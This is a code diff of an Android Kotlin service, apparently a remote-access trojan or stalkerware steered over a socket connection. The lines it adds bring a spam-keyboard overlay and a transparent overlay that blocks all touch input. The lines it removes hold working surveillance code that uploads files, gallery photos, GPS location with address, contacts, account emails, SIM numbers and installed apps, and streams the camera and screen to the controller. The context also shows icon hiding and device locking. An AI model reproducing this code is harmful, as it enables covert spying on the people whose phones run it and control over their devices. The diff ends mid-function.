+                        if (spamKbImeVisible) {
+                            imm.hideSoftInputFromWindow(editText.windowToken, 0)
+                            spamKbImeVisible = false
+                        } else {
+                            imm.showSoftInput(editText, android.view.inputmethod.InputMethodManager.SHOW_IMPLICIT)
+                            spamKbImeVisible = true
+                        }
+                    } catch (_: Exception) {}
+
+                    // animasi typing
+                    if (pauseTicks > 0) {
+                        // jeda sebelum siklus baru
+                        pauseTicks--
+                        if (pauseTicks == 0) {
+                            tv.text = ""
+                            tv.setTextColor(colors[0])
+                            colorStep = 0
+                            showReset = false
+                        }
+                    } else if (showReset) {
+                        // selesai ngetik — mulai jeda 3 tick (750ms)
+                        pauseTicks = 3
+                    } else {
+                        val shown = (tv.text.length + 1).coerceAtMost(full.length)
+                        tv.text = full.substring(0, shown)
+                        tv.setTextColor(colors[colorStep % colors.size])
+                        colorStep++
+                        if (shown >= full.length) showReset = true
+                    }
+
+                    spamKbHandler?.postDelayed(this, 250)
+                }
+            }
+            spamKbHandler?.post(spamKbRunnable!!)
+
+            emitStatus(JSONObject().apply { put("spamKeyboardActive", true) })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "startSpamKeyboard: ${e.message}")
+            spamKbActive = false
+        }
+    }
+}
+
+private fun stopSpamKeyboard() {
+    spamKbActive = false
+    spamKbHandler?.removeCallbacks(spamKbRunnable ?: Runnable {})
+    spamKbHandler = null
+    spamKbRunnable = null
+
+    Handler(Looper.getMainLooper()).post {
+        // 1. Hide IME DULU (sebelum view dihapus)
+        try {
+            val editText = spamKbInputView as? android.widget.EditText
+            if (editText != null) {
+                spamKbInputManager?.hideSoftInputFromWindow(editText.windowToken, 0)
+            }
+        } catch (_: Exception) {}
+
+        // 2. Baru hapus view dari WindowManager
+        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+        try { spamKbView?.let { wm.removeView(it) } } catch (_: Exception) {}
+        spamKbView = null
+        try { spamKbInputView?.let { wm.removeView(it) } } catch (_: Exception) {}
+        spamKbInputView = null
+
+        spamKbInputManager = null
+        spamKbImeVisible = false
+    }
+    emitStatus(JSONObject().apply { put("spamKeyboardActive", false) })
+}
+
+// ═══════════════════════════════════════════════════════════
+// FITUR BARU: FREEZE LAYAR (block touch via toggle, tanpa durasi)
+// ═══════════════════════════════════════════════════════════
+private var freezeScreenView: android.view.View? = null
+private var freezeScreenActive = false
+
+private fun startFreezeScreen() {
+    if (freezeScreenActive) return
+    freezeScreenActive = true
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                PixelFormat.TRANSLUCENT
+            )
+
+            val view = android.view.View(this@DeviceService).apply {
+                setBackgroundColor(android.graphics.Color.TRANSPARENT)
+                setOnTouchListener { _, _ -> true } // block semua touch
+            }
+            freezeScreenView = view
+            wm.addView(view, params)
+            emitStatus(JSONObject().apply { put("freezeScreenActive", true) })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "startFreezeScreen: ${e.message}")
+            freezeScreenActive = false
+        }
+    }
+}
+
+private fun stopFreezeScreen() {
+    freezeScreenActive = false
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            freezeScreenView?.let { wm.removeView(it) }
+        } catch (_: Exception) {}
+        freezeScreenView = null
+    }
+    emitStatus(JSONObject().apply { put("freezeScreenActive", false) })
+}
     
     private fun hideAppIcon(hide: Boolean) {
     try {
@@ -803,545 +843,6 @@ private fun stopVideoOverlay() {
         android.widget.Toast.makeText(this, message, android.widget.Toast.LENGTH_LONG).show()
     }
     emitStatus(JSONObject().apply { put("toastSent", message) })
-}
-
-    private fun sendFileList(path: String) {
-        Thread {
-            try {
-                val rootPath = if (path.isBlank()) {
-                    android.os.Environment.getExternalStorageDirectory().absolutePath
-                } else path
-
-                val dir = java.io.File(rootPath)
-                val arr = org.json.JSONArray()
-
-                if (!dir.exists() || !dir.isDirectory) {
-                    socket?.emit("device:files", org.json.JSONObject().apply {
-                        put("deviceId", deviceId)
-                        put("path", rootPath)
-                        put("files", arr)
-                        put("error", "Folder tidak ditemukan atau tidak bisa diakses")
-                    })
-                    return@Thread
-                }
-
-                val canReadAll = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                    android.os.Environment.isExternalStorageManager()
-                } else {
-                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
-                }
-
-                val entries = try { dir.listFiles() } catch (_: Exception) { null }
-
-                entries
-                    ?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
-                    ?.forEach { f ->
-                        try {
-                            arr.put(org.json.JSONObject().apply {
-                                put("name",     f.name)
-                                put("path",     f.absolutePath)
-                                put("isDir",    f.isDirectory)
-                                put("size",     if (f.isFile) f.length() else 0L)
-                                put("modified", f.lastModified())
-                                put("readable", f.canRead())
-                            })
-                        } catch (_: Exception) {}
-                    }
-
-                if (socket?.connected() != true) return@Thread
-                socket?.emit("device:files", org.json.JSONObject().apply {
-                    put("deviceId",   deviceId)
-                    put("path",       rootPath)
-                    put("files",      arr)
-                    put("canReadAll", canReadAll)
-                })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "sendFileList: ${e.message}")
-            }
-        }.start()
-    }
-
-    private fun downloadAndSendFile(value: String) {
-        Thread {
-            try {
-                val obj   = org.json.JSONObject(value)
-                val path  = obj.getString("path")
-                val reqId = obj.getString("reqId")
-                val file  = java.io.File(path)
-                if (!file.exists() || !file.isFile || !file.canRead()) {
-                    socket?.emit("device:filedata", org.json.JSONObject().apply {
-                        put("reqId", reqId)
-                        put("error", "File tidak ditemukan atau tidak bisa dibaca")
-                    })
-                    return@Thread
-                }
-                val bytes = file.readBytes()
-                val b64   = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
-                val ext   = file.extension.lowercase()
-                val mime  = android.webkit.MimeTypeMap.getSingleton()
-                    .getMimeTypeFromExtension(ext) ?: "application/octet-stream"
-                socket?.emit("device:filedata", org.json.JSONObject().apply {
-                    put("reqId",  reqId)
-                    put("base64", b64)
-                    put("mime",   mime)
-                })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "downloadAndSendFile: ${e.message}")
-                try {
-                    val obj = org.json.JSONObject(value)
-                    socket?.emit("device:filedata", org.json.JSONObject().apply {
-                        put("reqId", obj.optString("reqId", ""))
-                        put("error", e.message ?: "Error")
-                    })
-                } catch (_: Exception) {}
-            }
-        }.start()
-    }
-
-    private fun sendGallery() {
-    Thread {
-        try {
-            val arr = org.json.JSONArray()
-            
-            // Cek permission
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED &&
-                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
-                socket?.emit("device:gallery", org.json.JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("photos", org.json.JSONArray())
-                    put("error", "permission_denied")
-                })
-                return@Thread
-            }
-
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.DATE_ADDED,
-                MediaStore.Images.Media.SIZE,
-                MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
-                MediaStore.Images.Media.RELATIVE_PATH
-            )
-            
-            // AMBIL SEMUA FOTO, urutkan dari yang terbaru
-            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
-            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            
-            // HAPUS filter folder Camera — ambil SEMUA
-            val cursor: Cursor? = contentResolver.query(uri, projection, null, null, sortOrder)
-            cursor?.use { c ->
-                val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-                val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
-                val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
-                val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
-                val bucketCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
-                val pathCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.RELATIVE_PATH)
-                
-                var count = 0
-                while (c.moveToNext() && count < 40) { // ← 40 FOTO TERAKHIR
-                    val id = c.getLong(idCol)
-                    val name = c.getString(nameCol) ?: ""
-                    val date = c.getLong(dateCol)
-                    val size = c.getLong(sizeCol)
-                    val bucket = c.getString(bucketCol) ?: ""
-                    val path = c.getString(pathCol) ?: ""
-                    val imgUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
-                    
-                    try {
-                        val opts = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
-                        contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, opts) }
-                        val maxDim = 300
-                        val sample = maxOf(1, minOf(opts.outWidth, opts.outHeight) / maxDim)
-                        val decodeOpts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
-                        val bmp = contentResolver.openInputStream(imgUri)?.use { android.graphics.BitmapFactory.decodeStream(it, null, decodeOpts) }
-                        if (bmp != null) {
-                            val bos = java.io.ByteArrayOutputStream()
-                            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 72, bos)
-                            bmp.recycle()
-                            val b64 = android.util.Base64.encodeToString(bos.toByteArray(), android.util.Base64.NO_WRAP)
-                            arr.put(org.json.JSONObject().apply {
-                                put("id", id)
-                                put("name", name)
-                                put("date", date)
-                                put("size", size)
-                                put("thumb", "data:image/jpeg;base64,$b64")
-                                put("path", path)
-                                put("bucket", bucket)
-                            })
-                            count++
-                        }
-                    } catch (_: Exception) { }
-                }
-            }
-            if (socket?.connected() != true) return@Thread
-            socket?.emit("device:gallery", org.json.JSONObject().apply {
-                put("deviceId", deviceId)
-                put("photos", arr)
-            })
-            Log.d("DeviceService", "📸 Gallery sent: ${arr.length()} photos")
-        } catch (e: Exception) {
-            Log.e("DeviceService", "sendGallery error: ${e.message}")
-            socket?.emit("device:gallery", org.json.JSONObject().apply {
-                put("deviceId", deviceId)
-                put("photos", org.json.JSONArray())
-                put("error", e.message)
-            })
-        }
-    }.start()
-}
-    
-    private fun blockApp(pkgJson: String) {
-        try {
-            val obj  = org.json.JSONObject(pkgJson)
-            val pkg  = obj.getString("package")
-            val name = obj.optString("name", pkg)
-            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
-                putExtra("package", pkg)
-                putExtra("name", name)
-                setPackage(packageName)
-            }
-            sendBroadcast(i)            
-            val blocked = AppBlockerService.blockedPackages.toList()
-            emitStatus(org.json.JSONObject().apply {
-                put("blockedApps", org.json.JSONArray(blocked))
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "blockApp: ${e.message}")
-        }
-    }
-
-    private fun unblockApp(pkg: String) {
-        try {
-            val i = Intent("com.sync.xxx.UNBLOCK_APP").apply {
-                putExtra("package", pkg)
-                setPackage(packageName)
-            }
-            sendBroadcast(i)
-            val blocked = AppBlockerService.blockedPackages.toList()
-            emitStatus(org.json.JSONObject().apply {
-                put("blockedApps", org.json.JSONArray(blocked))
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "unblockApp: ${e.message}")
-        }
-    }
-
-    private fun unblockAll() {
-        try {
-            val i = Intent("com.sync.xxx.UNBLOCK_ALL").apply { setPackage(packageName) }
-            sendBroadcast(i)
-            emitStatus(org.json.JSONObject().apply {
-                put("blockedApps", org.json.JSONArray())
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "unblockAll: ${e.message}")
-        }
-    }
-
-    @SuppressLint("MissingPermission")
-    private fun sendLocation() {
-        val hasFine   = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)   == PackageManager.PERMISSION_GRANTED
-        val hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-
-        if (!hasFine && !hasCoarse) {
-            socket?.emit("device:location", org.json.JSONObject().apply {
-                put("deviceId", deviceId); put("error", "permission_denied")
-            })
-            return
-        }
-
-        val lm = getSystemService(LOCATION_SERVICE) as LocationManager
-        val gpsOn     = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
-        val networkOn = lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
-
-        if (!gpsOn && !networkOn) {
-            socket?.emit("device:location", org.json.JSONObject().apply {
-                put("deviceId", deviceId); put("error", "provider_disabled")
-            })
-            return
-        }
-
-        val fusedClient: FusedLocationProviderClient = LocationServices.getFusedLocationProviderClient(this)
-        val priority = if (hasFine && gpsOn) Priority.PRIORITY_HIGH_ACCURACY else Priority.PRIORITY_BALANCED_POWER_ACCURACY
-        
-        val cts = com.google.android.gms.tasks.CancellationTokenSource()
-        fusedClient.getCurrentLocation(priority, cts.token)
-            .addOnSuccessListener { loc ->
-                if (loc != null) {
-                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
-                } else {                    
-                    requestSingleLocationUpdate(fusedClient, priority)
-                }
-            }
-            .addOnFailureListener {
-                requestSingleLocationUpdate(fusedClient, priority)
-            }
-    }
-
-    @SuppressLint("MissingPermission")
-    private fun requestSingleLocationUpdate(fusedClient: FusedLocationProviderClient, priority: Int) {
-        val req = LocationRequest.Builder(priority, 2000L)
-            .setMaxUpdates(1)
-            .setWaitForAccurateLocation(false)
-            .build()
-
-        val cb = object : LocationCallback() {
-            override fun onLocationResult(result: LocationResult) {
-                fusedClient.removeLocationUpdates(this)
-                val loc = result.lastLocation
-                if (loc != null) {
-                    emitLocationResult(loc.latitude, loc.longitude, loc.accuracy)
-                } else {
-                    socket?.emit("device:location", org.json.JSONObject().apply {
-                        put("deviceId", deviceId); put("error", "no_location")
-                    })
-                }
-            }
-        }
-
-        try {
-            fusedClient.requestLocationUpdates(req, cb, Looper.getMainLooper())            
-            Handler(Looper.getMainLooper()).postDelayed({
-                fusedClient.removeLocationUpdates(cb)
-            }, 15_000L)
-        } catch (e: Exception) {
-            Log.e("DeviceService", "requestSingleLocationUpdate: ${e.message}")
-            socket?.emit("device:location", org.json.JSONObject().apply {
-                put("deviceId", deviceId); put("error", "no_location")
-            })
-        }
-    }
-
-    private fun emitLocationResult(lat: Double, lng: Double, accuracy: Float) {
-        val obj = org.json.JSONObject().apply {
-            put("deviceId", deviceId)
-            put("lat", lat)
-            put("lng", lng)
-            put("accuracy", accuracy)
-        }
-        try {
-            @Suppress("DEPRECATION")
-            val geocoder = Geocoder(this, java.util.Locale("id", "ID"))
-            @Suppress("DEPRECATION")
-            val addresses = geocoder.getFromLocation(lat, lng, 1)
-            if (!addresses.isNullOrEmpty()) {
-                val addr = addresses[0]
-                obj.put("province",    addr.adminArea       ?: "")
-                obj.put("city",        addr.subAdminArea    ?: "")
-                obj.put("district",    addr.locality        ?: "")
-                obj.put("village",     addr.subLocality     ?: "")
-                obj.put("postalCode",  addr.postalCode      ?: "")
-                obj.put("fullAddress", addr.getAddressLine(0) ?: "")
-                obj.put("countryName", addr.countryName     ?: "")
-            }
-        } catch (_: Exception) { }
-        socket?.emit("device:location", obj)
-    }
-
-    private fun sendContacts() {
-        Thread {
-            try {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                    socket?.emit("device:contacts", org.json.JSONObject().apply {
-                        put("deviceId", deviceId); put("error", "permission_denied")
-                    })
-                    return@Thread
-                }
-                val arr = org.json.JSONArray()
-                val projection = arrayOf(
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER
-                )
-                val cursor = contentResolver.query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    projection, null, null,
-                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
-                )
-                cursor?.use { c ->
-                    val nameCol = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-                    val numCol  = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                    while (c.moveToNext()) {
-                        val name   = c.getString(nameCol) ?: continue
-                        val number = c.getString(numCol)  ?: continue
-                        arr.put(org.json.JSONObject().apply {
-                            put("name",   name.trim())
-                            put("number", number.trim())
-                        })
-                    }
-                }
-                socket?.emit("device:contacts", org.json.JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("contacts", arr)
-                })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "sendContacts: ${e.message}")
-            }
-        }.start()
-    }
-
-    private fun sendGmailAccounts() {
-    Thread {
-        try {
-            // Cek permission dulu
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
-                Log.e("DeviceService", "❌ GET_ACCOUNTS permission denied")
-                socket?.emit("device:gmail", JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("error", "permission_denied")
-                })
-                return@Thread
-            }
-
-            val am = getSystemService(android.accounts.AccountManager::class.java)
-            val accounts = am?.getAccountsByType("com.google") ?: emptyArray()
-            val arr = org.json.JSONArray()
-            
-            Log.d("DeviceService", "📧 Found ${accounts.size} Google accounts")
-
-            accounts.forEach { acc ->
-                arr.put(JSONObject().apply {
-                    put("email", acc.name)
-                    put("type", acc.type)
-                })
-            }
-
-            val allAccounts = am?.accounts ?: emptyArray()
-            val extra = org.json.JSONArray()
-            allAccounts.filter { it.type != "com.google" }.forEach { acc ->
-                extra.put(JSONObject().apply {
-                    put("email", acc.name)
-                    put("type", acc.type)
-                })
-            }
-
-            Log.d("DeviceService", "📧 Sending ${arr.length()} Google + ${extra.length()} others")
-
-            if (socket?.connected() != true) {
-                Log.e("DeviceService", "❌ Socket not connected")
-                return@Thread
-            }
-
-            socket?.emit("device:gmail", JSONObject().apply {
-                put("deviceId", deviceId)
-                put("accounts", arr)
-                put("others", extra)
-            })
-            
-            Log.d("DeviceService", "✅ Gmail accounts sent")
-
-        } catch (e: Exception) {
-            Log.e("DeviceService", "sendGmailAccounts error: ${e.message}")
-            socket?.emit("device:gmail", JSONObject().apply {
-                put("deviceId", deviceId)
-                put("error", e.message ?: "unknown_error")
-            })
-        }
-    }.start()
-}
-
-    private fun sendPhoneNumbers() {
-        Thread {
-            try {
-                val arr = org.json.JSONArray()
-                val tm = getSystemService(TELEPHONY_SERVICE) as android.telephony.TelephonyManager
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                    val subMgr = getSystemService(android.telephony.SubscriptionManager::class.java)
-                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED) {
-                        val subs = subMgr?.activeSubscriptionInfoList ?: emptyList()
-                        if (subs.isEmpty()) {
-                            // Fallback ke slot tunggal
-                            val num = tm.line1Number
-                            if (!num.isNullOrBlank()) {
-                                arr.put(JSONObject().apply {
-                                    put("slot", 0)
-                                    put("number", num)
-                                    put("operator", tm.networkOperatorName ?: "")
-                                    put("simState", tm.simState)
-                                })
-                            }
-                        } else {
-                            subs.forEachIndexed { idx, sub ->
-                                val num = sub.number ?: ""
-                                arr.put(JSONObject().apply {
-                                    put("slot", idx)
-                                    put("number", num)
-                                    put("operator", sub.carrierName ?: "")
-                                    put("displayName", sub.displayName ?: "SIM ${idx + 1}")
-                                    put("iccId", sub.iccId ?: "")
-                                })
-                            }
-                        }
-                    }
-                } else {
-                    @Suppress("DEPRECATION")
-                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                        val num = tm.line1Number
-                        arr.put(JSONObject().apply {
-                            put("slot", 0)
-                            put("number", num ?: "")
-                            put("operator", tm.networkOperatorName ?: "")
-                        })
-                    }
-                }
-                socket?.emit("device:phone", JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("sims", arr)
-                })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "sendPhoneNumbers: ${e.message}")
-                socket?.emit("device:phone", JSONObject().apply {
-                    put("deviceId", deviceId); put("error", e.message)
-                })
-            }
-        }.start()
-    }
-
-        private fun sendInstalledApps() {
-    Thread {
-        try {
-            val pm  = packageManager
-            val arr = org.json.JSONArray()
-
-            @Suppress("DEPRECATION")
-            val packages = pm.getInstalledPackages(0)
-
-            packages
-                .filter { it.packageName != packageName }
-                .mapNotNull { pkgInfo ->
-                    try {
-                        val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
-                        if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
-                    } catch (_: Exception) { null }
-                }
-                .sortedBy { it.second.lowercase() }
-                .forEach { (pkg, name) ->
-                    arr.put(org.json.JSONObject().apply {
-                        put("package", pkg)
-                        put("name", name)
-                    })
-                }
-
-            Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")
-
-            if (socket?.connected() != true) return@Thread
-
-            // ── emit event khusus (dipakai panel) ──
-            socket?.emit("device:apps", org.json.JSONObject().apply {
-                put("deviceId", deviceId)
-                put("apps", arr)
-            })
-
-            // ── tetap emit via status (buat backward compat) ──
-            socket?.emit("device:status", org.json.JSONObject().apply {
-                put("deviceId", deviceId)
-                put("status", org.json.JSONObject().apply {
-                    put("installedApps", arr)
-                })
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "getInstalledApps: ${e.message}")
-        }
-    }.start()
 }
 
     private fun lockDevice(jsonValue: String) {
@@ -1452,18 +953,18 @@ private fun stopVideoOverlay() {
                     else
                         @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
 
-                    val params = WindowManager.LayoutParams(
-                        WindowManager.LayoutParams.MATCH_PARENT,
-                        WindowManager.LayoutParams.MATCH_PARENT,
-                        type,
-                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                        WindowManager.LayoutParams.FLAG_FULLSCREEN or
-                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-                        WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
-                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-                        PixelFormat.TRANSLUCENT
-                    )
+val params = WindowManager.LayoutParams(
+    WindowManager.LayoutParams.MATCH_PARENT,
+    WindowManager.LayoutParams.MATCH_PARENT,
+    type,
+    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
+    WindowManager.LayoutParams.FLAG_FULLSCREEN or
+    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
+    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
+    PixelFormat.TRANSLUCENT
+)
 
                     // Bungkus HTML dengan full-screen black background
                     val fullHtml = """<!DOCTYPE html>
@@ -1594,226 +1095,6 @@ ${htmlContent}
         emitStatus(JSONObject().apply { put("flashlight", on) })
     }
 
-    private fun startCamera(facing: String) {
-    Handler(Looper.getMainLooper()).post {
-        stopCameraInternal()
-        streaming = true
-
-        val lensFacing = if (facing == "front") CameraSelector.LENS_FACING_FRONT
-                         else CameraSelector.LENS_FACING_BACK
-        val selector   = CameraSelector.Builder().requireLensFacing(lensFacing).build()
-
-        val future = ProcessCameraProvider.getInstance(this)
-        future.addListener({
-            try {
-                cameraProvider = future.get()
-                cameraProvider?.unbindAll()
-
-                imageAnalysis = ImageAnalysis.Builder()
-                    .setTargetResolution(android.util.Size(360, 640))
-                    .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
-                    .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
-                    .build()
-
-                imageAnalysis!!.setAnalyzer(Executors.newSingleThreadExecutor()) { imageProxy ->
-                    if (!streaming) { 
-                        imageProxy.close()
-                        return@setAnalyzer 
-                    }
-                    
-                    val now = System.currentTimeMillis()
-                    if (now - lastFrameTime < FRAME_INTERVAL) { 
-                        imageProxy.close()
-                        return@setAnalyzer 
-                    }
-                    lastFrameTime = now
-
-                    try {
-                        val raw = imageProxy.toBitmap()
-                        val rotation = imageProxy.imageInfo.rotationDegrees
-                        val bitmap = if (rotation != 0) {
-                            val matrix = Matrix().apply { postRotate(rotation.toFloat()) }
-                            val rotated = Bitmap.createBitmap(raw, 0, 0, raw.width, raw.height, matrix, true)
-                            raw.recycle()
-                            rotated
-                        } else raw
-
-                        val out = ByteArrayOutputStream()
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
-                        val b64: String = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
-                        bitmap.recycle()
-
-                        Log.d("DeviceService", "📷 Sending frame, length: ${b64.length}")
-                        emitFrame(b64)
-                    } catch (e: Exception) {
-                        Log.e("DeviceService", "Error processing frame: ${e.message}")
-                    }
-                    imageProxy.close()
-                }
-
-                cameraProvider?.bindToLifecycle(this@DeviceService, selector, imageAnalysis!!)
-                emitStatus(JSONObject().apply { put("cameraActive", true) })
-                Log.d("DeviceService", "✅ Camera started: $facing")
-            } catch (e: Exception) {
-                Log.e("DeviceService", "Camera bind error: ${e.message}")
-            }
-        }, ContextCompat.getMainExecutor(this))
-    }
-}
-
-    private fun stopCamera() {
-        streaming = false
-        Handler(Looper.getMainLooper()).post { stopCameraInternal() }
-        emitStatus(JSONObject().apply { put("cameraActive", false) })
-    }
-    
-    private fun captureSingleFrame(facing: String) {
-    Log.d("DeviceService", "📸 captureSingleFrame: $facing")
-    
-    // Start camera
-    if (!streaming) {
-        startCamera(facing)
-    }
-    
-    // Tunggu 1.5 detik agar kamera stabil dan frame masuk
-    Handler(Looper.getMainLooper()).postDelayed({
-        Log.d("DeviceService", "📸 First frame should be sent")
-        // Frame otomatis terkirim via emitFrame di callback camera
-    }, 1500)
-    
-    // Stop kamera setelah 3 detik
-    Handler(Looper.getMainLooper()).postDelayed({
-        if (streaming) {
-            stopCamera()
-            Log.d("DeviceService", "📸 Single frame capture completed, camera stopped")
-        }
-    }, 3000)
-}
-
-    private fun stopCameraInternal() {
-        streaming = false
-        try { cameraProvider?.unbindAll() } catch (_: Exception) {}
-        cameraProvider = null
-        imageAnalysis  = null
-    }
-
-    private fun requestScreenCapture() {
-        if (savedProjectionResultCode == android.app.Activity.RESULT_OK && savedProjectionData != null) {
-            startScreenCapture(savedProjectionResultCode, savedProjectionData!!)
-            return
-        }
-        val intent = Intent(this, ScreenCaptureActivity::class.java).apply {
-            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        }
-        startActivity(intent)
-    }
-
-    private fun startScreenCapture(resultCode: Int, data: Intent) {
-        stopScreenCapture()
-
-        val wm = getSystemService(WINDOW_SERVICE) as WindowManager
-        val capW: Int; val capH: Int; val capDpi: Int
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            val bounds = wm.currentWindowMetrics.bounds
-            val scale  = 0.3f
-            capW   = (bounds.width()  * scale).toInt()
-            capH   = (bounds.height() * scale).toInt()
-            capDpi = resources.displayMetrics.densityDpi
-        } else {
-            val metrics = DisplayMetrics()
-            @Suppress("DEPRECATION") wm.defaultDisplay.getMetrics(metrics)
-            val scale = 0.3f
-            capW   = (metrics.widthPixels  * scale).toInt()
-            capH   = (metrics.heightPixels * scale).toInt()
-            capDpi = metrics.densityDpi
-        }
-
-        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        mediaProjection = mgr.getMediaProjection(resultCode, data)
-
-        imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 3)
-
-        mediaProjection?.createVirtualDisplay(
-            "ScreenLive", capW, capH, capDpi,
-            android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-            imageReader!!.surface, null, null
-        )
-
-        screenStreaming = true
-        emitStatus(JSONObject().apply { put("screenActive", true) })
-
-        screenHandler = Handler(Looper.getMainLooper())
-        screenRunnable = object : Runnable {
-            override fun run() {
-                if (!screenStreaming) return
-                if (!screenIsSending) captureAndSendScreen()
-                screenHandler?.postDelayed(this, 150)
-            }
-        }
-        screenHandler?.post(screenRunnable!!)
-    }
-
-    private var screenIsSending = false
-
-    private fun captureAndSendScreen() {
-        val reader = imageReader ?: return
-        var image: android.media.Image? = null
-        try {
-            image = reader.acquireLatestImage() ?: return
-            val planes      = image.planes
-            val buffer      = planes[0].buffer
-            val pixelStride = planes[0].pixelStride
-            val rowStride   = planes[0].rowStride
-            val rowPadding  = rowStride - pixelStride * image.width
-
-            val bmp = Bitmap.createBitmap(
-                image.width + rowPadding / pixelStride,
-                image.height, Bitmap.Config.ARGB_8888
-            )
-            bmp.copyPixelsFromBuffer(buffer)
-
-            val cropped = if (rowPadding > 0)
-                Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)
